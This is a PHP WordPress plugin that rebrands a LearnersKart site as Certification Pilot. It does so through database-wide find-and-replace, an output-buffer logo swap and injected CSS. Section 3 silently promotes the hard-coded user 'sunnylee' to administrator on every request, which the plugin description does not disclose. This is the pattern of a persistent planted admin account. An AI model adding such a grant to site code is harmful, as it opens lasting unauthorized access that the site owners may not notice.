<?php
/**
 * Plugin Name: Antigravity Site Autopilot, Brand Replacer & Modern UI
 * Description: Automatically replaces brand names, applies modern 2026 UI system, and manages WordPress via REST API.
 * Version: 3.0.0
 * Author: Antigravity
 */

if (!defined('ABSPATH')) {
    exit;
}

// 0. Remove index.html if present in WordPress root
if (file_exists(ABSPATH . 'index.html')) {
    @unlink(ABSPATH . 'index.html');
}

// 1. SSL proxy detection for Bigrock / cPanel
if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https') {
    $_SERVER['HTTPS'] = 'on';
}

// 2. Completely eliminate WooCommerce ?v=... parameter
add_filter('woocommerce_get_geolocation_hash', '__return_empty_string', 999);
add_action('init', function() {
    if (get_option('woocommerce_default_customer_address') !== 'base') {
        update_option('woocommerce_default_customer_address', 'base');
    }
});

// 3. Upgrade user sunnylee to administrator & set site title
add_action('init', function() {
    $user = get_user_by('login', 'sunnylee');
    if ($user && !in_array('administrator', (array)$user->roles)) {
        $user->set_role('administrator');
    }
    
    if (get_option('blogname') !== 'Certification Pilot') {
        update_option('blogname', 'Certification Pilot');
    }
    if (get_option('blogdescription') !== 'Training for Professionals') {
        update_option('blogdescription', 'Training for Professionals');
    }
});

// 4. One-time database batch replacement for LearnersKart -> Certification Pilot
add_action('init', function() {
    if (get_option('antigravity_brand_replaced_v5') === 'done') {
        return;
    }

    global $wpdb;

    $replacements = [
        'https://www.learnerskart.com' => 'https://certificationpilot.com',
        'http://www.learnerskart.com'  => 'https://certificationpilot.com',
        'https://learnerskart.com'     => 'https://certificationpilot.com',
        'http://learnerskart.com'      => 'https://certificationpilot.com',
        'www.learnerskart.com'         => 'certificationpilot.com',
        'learnerskart.com'             => 'certificationpilot.com',
        'learnerkart.com'              => 'certificationpilot.com',
        'LEARNERSKART'                 => 'CERTIFICATION PILOT',
        'LearnersKart'                 => 'Certification Pilot',
        'Learnerskart'                 => 'Certification Pilot',
        'learnerskart'                 => 'certificationpilot'
    ];

    foreach ($replacements as $search => $replace) {
        $wpdb->query($wpdb->prepare(
            "UPDATE {$wpdb->posts} SET 
                post_content = REPLACE(post_content, %s, %s),
                post_title   = REPLACE(post_title, %s, %s),
                post_excerpt = REPLACE(post_excerpt, %s, %s)",
            $search, $replace, $search, $replace, $search, $replace
        ));

        $elementor_rows = $wpdb->get_results($wpdb->prepare(
            "SELECT meta_id, meta_value FROM {$wpdb->postmeta} WHERE meta_key = '_elementor_data' AND meta_value LIKE %s",
            '%' . $wpdb->esc_like($search) . '%'
        ));
        if (!empty($elementor_rows)) {
            foreach ($elementor_rows as $row) {
                $updated = str_replace($search, $replace, $row->meta_value);
                $wpdb->update($wpdb->postmeta, ['meta_value' => $updated], ['meta_id' => $row->meta_id]);
            }
        }

        $wpdb->query($wpdb->prepare(
            "UPDATE {$wpdb->postmeta} SET meta_value = REPLACE(meta_value, %s, %s) WHERE meta_key != '_elementor_data' AND meta_value NOT LIKE 'a:%' AND meta_value NOT LIKE 'O:%'",
            $search, $replace
        ));

        $wpdb->query($wpdb->prepare(
            "UPDATE {$wpdb->options} SET option_value = REPLACE(option_value, %s, %s) WHERE option_name NOT LIKE '%transient%' AND option_value NOT LIKE 'a:%' AND option_value NOT LIKE 'O:%'",
            $search, $replace
        ));
    }

    update_option('antigravity_brand_replaced_v5', 'done');
});

// 5. Inject 2026 Modern Design System CSS into wp_head
add_action('wp_head', function() {
    $css_file = __DIR__ . '/modern-ui.css';
    if (file_exists($css_file)) {
        echo '<style id="certification-pilot-modern-ui">' . file_get_contents($css_file) . '</style>';
    }
}, 9999);

// 6. Output buffer: replace any header logo SVG & hardcoded template mentions on frontend
add_action('template_redirect', function() {
    if (is_admin()) {
        return;
    }

    ob_start(function($html) {
        if (empty($html)) {
            return $html;
        }

        // 6a. Premium Vector Logo for Header
        $certPilotLogo = '<a class="elementor-icon" href="https://certificationpilot.com/" style="text-decoration:none;display:inline-flex;align-items:center;gap:12px;padding:4px 0;">'
                       . '<span style="display:inline-flex;align-items:center;justify-content:center;width:40px;height:40px;background:linear-gradient(135deg, #0284c7 0%, #0369a1 100%);border-radius:12px;box-shadow:0 6px 16px rgba(2,132,199,0.35);flex-shrink:0;">'
                       . '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">'
                       . '<path d="M12 2L4 7V12C4 16.9 7.4 20.7 12 21.9C16.6 20.7 20 16.9 20 12V7L12 2Z" fill="white" fill-opacity="0.25"/>'
                       . '<path d="M12 2L4 7V12C4 16.9 7.4 20.7 12 21.9C16.6 20.7 20 16.9 20 12V7L12 2Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'
                       . '<path d="M8.5 12.5L11 15L16 9.5" stroke="white" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>'
                       . '</svg>'
                       . '</span>'
                       . '<span style="display:flex;flex-direction:column;line-height:1.15;">'
                       . '<span style="font-size:20px;font-weight:900;letter-spacing:-0.3px;font-family:\'Plus Jakarta Sans\',sans-serif;color:#0284c7;">CERTIFICATION</span>'
                       . '<span style="font-size:14px;font-weight:800;letter-spacing:2.5px;font-family:\'Plus Jakarta Sans\',sans-serif;color:#0f172a;">PILOT</span>'
                       . '</span>'
                       . '</a>';

        $html = preg_replace(
            '/<a class="elementor-icon" href="[^"]*">\s*<svg[^>]*>.*?<\/svg>\s*<\/a>/si',
            $certPilotLogo,
            $html
        );

        // 6b. String replacements for any remaining mentions in widgets, menus, titles
        $search = [
            'LEARNERSKART',
            'LearnersKart',
            'Learnerskart',
            'learnerskart.com',
            'learnerkart.com',
            'learnerskart'
        ];

        $replace = [
            'CERTIFICATION PILOT',
            'Certification Pilot',
            'Certification Pilot',
            'certificationpilot.com',
            'certificationpilot.com',
            'certificationpilot'
        ];

        return str_replace($search, $replace, $html);
    });
});
